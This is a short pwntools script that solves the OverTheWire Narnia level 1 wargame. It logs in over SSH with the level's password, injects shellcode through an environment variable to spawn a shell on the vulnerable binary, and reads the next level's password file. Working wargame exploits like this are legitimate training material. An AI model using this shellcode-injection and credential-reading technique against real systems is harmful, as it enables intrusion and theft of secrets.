from pwn import *

s = ssh(host='narnia.labs.overthewire.org',port=2226,user='narnia1',password='efeidiedae')
p = s.process('/narnia/narnia1',env={"EGG":asm(shellcraft.sh())}) # 32 bit shellcode required

p.recvuntil(b'$')
p.sendline(b'cat /etc/narnia_pass/narnia2')
print('\nnarnia2 pass: ' + p.recvline().decode())

p.close()
s.close()
